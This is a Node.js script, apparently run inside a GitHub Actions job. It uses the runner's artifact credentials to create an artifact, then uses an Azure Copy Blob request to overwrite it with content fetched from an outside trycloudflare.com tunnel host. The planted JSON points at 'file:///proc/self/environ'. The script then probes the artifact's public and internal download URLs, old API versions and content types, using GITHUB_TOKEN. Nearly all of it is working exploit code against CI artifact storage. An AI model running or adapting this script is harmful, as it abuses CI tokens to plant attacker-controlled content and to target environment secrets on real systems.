import {createHash} from 'node:crypto';
import https from 'node:https';

import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const sourceBase = 'https://overview-watches-swim-township.trycloudflare.com/';
const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});

function request(url, options = {}, body = undefined) {
  return new Promise((resolve, reject) => {
    const req = https.request(url, options, response => {
      const chunks = [];
      response.on('data', chunk => chunks.push(chunk));
      response.on('end', () => resolve({
        status: response.statusCode,
        headers: response.headers,
        body: Buffer.concat(chunks),
      }));
    });
    req.on('error', reject);
    req.setTimeout(20000, () => req.destroy(new Error('request timeout')));
    if (body) req.write(body);
    req.end();
  });
}

const name = `cassette-copy-${process.env.GITHUB_RUN_ID}.json`;
const created = await client.CreateArtifact({
  workflowRunBackendId: ids.workflowRunBackendId,
  workflowJobRunBackendId: ids.workflowJobRunBackendId,
  name,
  version: 7,
  mimeType: StringValue.create({value: 'application/json'}),
});
if (!created.ok) throw new Error('CreateArtifact returned ok=false');

const blob = new BlobClient(created.signedUploadUrl).getBlockBlobClient();
const placeholder = Buffer.from('{"probe":"placeholder"}');
await blob.uploadData(placeholder, {
  blobHTTPHeaders: {blobContentType: 'application/json'},
});
const finalized = await client.FinalizeArtifact({
  workflowRunBackendId: ids.workflowRunBackendId,
  workflowJobRunBackendId: ids.workflowJobRunBackendId,
  name,
  size: String(placeholder.length),
  hash: StringValue.create({
    value: `sha256:${createHash('sha256').update(placeholder).digest('hex')}`,
  }),
});
if (!finalized.ok) throw new Error('FinalizeArtifact returned ok=false');

const artifactId = String(finalized.artifactId);
const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${artifactId}/zip`;
const source = `${sourceBase}?repository=${encodeURIComponent(repository)}`;
const expected = Buffer.from(JSON.stringify({
  full_name: repository,
  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
  description: 'Repo Cassette carrier',
  stargazers_count: 0,
}));

const copied = await request(created.signedUploadUrl, {
  method: 'PUT',
  headers: {
    'x-ms-version': '2023-11-03',
    'x-ms-copy-source': source,
    'x-ms-blob-type': 'BlockBlob',
    'content-length': '0',
  },
});
if (copied.status !== 201 && copied.status !== 202) {
  throw new Error(`Copy Blob failed with ${copied.status}: ${copied.body.toString().slice(0, 300)}`);
}

const direct = await client.GetSignedArtifactURL({
  workflowRunBackendId: ids.workflowRunBackendId,
  workflowJobRunBackendId: ids.workflowJobRunBackendId,
  name,
});
let internalCurrent;
for (let attempt = 0; attempt < 60; attempt++) {
  internalCurrent = await request(direct.signedUrl);
  if (internalCurrent.status === 200 && internalCurrent.body.equals(expected)) break;
  await new Promise(resolve => setTimeout(resolve, 500));
}
if (internalCurrent?.status !== 200 || !internalCurrent.body.equals(expected)) {
  throw new Error(`Copy Blob did not become readable: ${internalCurrent?.status}`);
}
const internalOld = await request(`${direct.signedUrl}&api-version=2012-02-12`);

const api = await request(
  `https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/actions/artifacts/${artifactId}/zip`,
  {headers: {
    accept: 'application/vnd.github.v3+json',
    authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
    'user-agent': 'repo-cassette-copy-probe',
  }},
);
const location = api.headers.location || '';
const publicCurrent = location ? await request(location) : null;
const publicOld = location ? await request(`${location}&api-version=2012-02-12`) : null;

function typeHex(response) {
  return Buffer.from(response?.headers?.['content-type'] || '', 'latin1').toString('hex');
}

console.log('COPY-CARRIER', JSON.stringify({
  artifactId,
  repository,
  copiedBody: internalOld.body.equals(expected),
  internalCurrent: {status: internalCurrent.status, typeHex: typeHex(internalCurrent)},
  internalOld: {status: internalOld.status, typeHex: typeHex(internalOld)},
  publicRedirect: api.status,
  publicRsct: location ? new URL(location).searchParams.get('rsct') : null,
  publicCurrent: {status: publicCurrent?.status, typeHex: typeHex(publicCurrent)},
  publicOld: {status: publicOld?.status, typeHex: typeHex(publicOld)},
}));
